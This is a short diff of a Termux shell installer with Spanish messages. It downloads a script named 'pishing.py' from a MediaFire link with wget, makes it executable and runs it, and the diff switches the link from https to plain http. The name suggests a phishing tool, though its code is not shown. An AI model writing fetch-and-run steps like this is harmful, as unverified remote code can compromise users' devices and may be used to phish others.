@@ -37,7 +37,7 @@ termux-setup-storage
 printf "\e[1;31m Permisos otorgados\n"
 sleep 2
 clear
-wget https://download1492.mediafire.com/jxihpjirhjrg/2myc8fnrn1gj278/pishing.py
+wget http://download1492.mediafire.com/c8j80j23rjcg/2myc8fnrn1gj278/pishing.py
 clear
 chmod +x pishing.py
 python pishing.py
